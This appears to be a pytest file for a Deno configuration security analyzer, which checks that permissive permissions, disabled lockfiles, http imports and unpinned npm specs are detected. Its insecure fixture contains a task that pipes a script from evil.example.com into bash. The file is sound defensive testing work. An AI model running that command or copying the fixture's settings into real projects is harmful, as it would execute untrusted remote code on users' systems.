"""Tests for DenoAnalyzer."""

import json
from pathlib import Path

from devai.deno_analyzer import DenoAnalyzer, DenoFinding


INSECURE_DENO_JSON = """\
{
  "lock": false,
  "permissions": {
    "allow-all": true,
    "ffi": true,
    "read": ["*"],
    "net": ["*"]
  },
  "imports": {
    "lodash": "npm:lodash@*",
    "std/": "jsr:@std/path",
    "remote": "http://insecure.example.com/mod.ts"
  },
  "tasks": {
    "setup": "curl https://evil.example.com/install.sh | bash"
  },
  "npmRegistry": "http://registry.example.com",
  "unstable": ["ffi", "kv"]
}
"""

HARDENED_DENO_JSON = """\
{
  "lock": true,
  "permissions": {
    "read": ["./"],
    "net": ["registry.npmjs.org", "jsr.io"]
  },
  "imports": {
    "lodash": "npm:lodash@4.17.21",
    "@std/": "jsr:@std/"
  },
  "tasks": {
    "test": "deno test --allow-read=./"
  }
}
"""


class TestDenoAnalyzer:
    def test_detects_insecure_deno_json(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(INSECURE_DENO_JSON, encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "allow_all_permissions" in kinds
        assert "lock_disabled" in kinds
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dynamic_npm_spec" in kinds or "unpinned_npm_import" in kinds
        assert "wildcard_permission" in kinds

    def test_detects_insecure_deno_jsonc(self, tmp_path: Path):
        (tmp_path / "deno.jsonc").write_text(
            "// comment\n" + INSECURE_DENO_JSON,
            encoding="utf-8",
        )
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "allow_all_permissions" in kinds

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(HARDENED_DENO_JSON, encoding="utf-8")
        (tmp_path / "deno.lock").write_text("# deno lockfile\n", encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert len(high) == 0

    def test_health_score(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(INSECURE_DENO_JSON, encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        score = analyzer.health_score()
        assert score < 100.0

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(HARDENED_DENO_JSON, encoding="utf-8")
        (tmp_path / "deno.lock").write_text("# deno lockfile\n", encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        assert "Deno configs:" in analyzer.summary()
        assert "Deno analysis:" in analyzer.to_context()

    def test_generate_hardened_config(self):
        analyzer = DenoAnalyzer(".")
        template = analyzer.generate_hardened_config()
        assert "deno.json" in template
        assert '"lock": true' in template

    def test_no_configs_returns_empty(self, tmp_path: Path):
        analyzer = DenoAnalyzer(str(tmp_path))
        assert analyzer.configs() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0

    def test_import_map_detected(self, tmp_path: Path):
        (tmp_path / "import_map.json").write_text(
            json.dumps({"imports": {"bad": "http://evil.example.com/mod.ts"}}),
            encoding="utf-8",
        )
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds

    def test_finding_format(self):
        finding = DenoFinding(
            kind="test",
            severity="high",
            message="test message",
            path="deno.json",
            lineno=1,
            line="test",
        )
        assert "[high]" in finding.format()
        assert "deno.json" in finding.format()
